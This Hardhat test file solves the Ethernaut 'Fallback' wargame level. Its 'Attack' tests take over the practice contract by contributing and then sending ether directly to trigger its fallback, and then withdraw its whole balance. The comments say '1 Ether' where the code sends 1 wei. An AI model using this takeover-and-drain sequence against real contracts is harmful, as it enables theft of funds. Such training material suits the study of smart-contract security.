import { ethers } from "hardhat";
import { expect } from "chai";

describe("Ethernaut: Fallback", function () {
  
  // Helper function to deploy the Fallback contract and get signer instances
  async function deployFallback() {
    const [owner, add1, add2] = await ethers.getSigners();
    const FALLBACK = await ethers.getContractFactory("Fallback");
    const fallback = await FALLBACK.deploy();
    return { owner, add1, add2, fallback };
  }

  describe("Test Fallback", function () {
    it("Basic Test", async () => {
      const { owner, add1, fallback } = await deployFallback();
      // Check if the owner is the deployer
      expect(await(fallback.owner())).to.equal(owner.address);
      // Check initial contribution is 0
      expect(await(fallback.connect(add1).getContribution())).to.equal(0);
    });

    it("Contribution", async () => {
      const { add1, fallback } = await deployFallback();
      // Make a 1 Ether contribution
      await fallback.connect(add1).contribute({value: 1});
      // Check contribution is 1
      expect(await(fallback.connect(add1).getContribution())).to.equal(1);
    });

    it("Attack: Claim ownership", async () => {
      const { add1, fallback } = await deployFallback();
      // Make a 1 Ether contribution
      await fallback.connect(add1).contribute({value:1});
      // Attack: send Ether directly to the contract
      await add1.sendTransaction({to:fallback.address, value:1});
      // Check attacker is now the owner
      expect(await fallback.owner()).to.equal(add1.address);
    });

    it("Attack: Reduce balance to 0", async () => {
      const { add1, fallback } = await deployFallback();
      await fallback.connect(add1).contribute({value:1});
      await add1.sendTransaction({to:fallback.address, value:1});
      // Perform a fund withdrawal
      await fallback.connect(add1).withdraw();
      // Get the balance of the contract after the withdrawal
      const balanceAfter = await ethers.provider.getBalance(fallback.address);
      // Check the balance is 0 after withdrawal
      expect(balanceAfter).to.equal(0);
    });
  });
});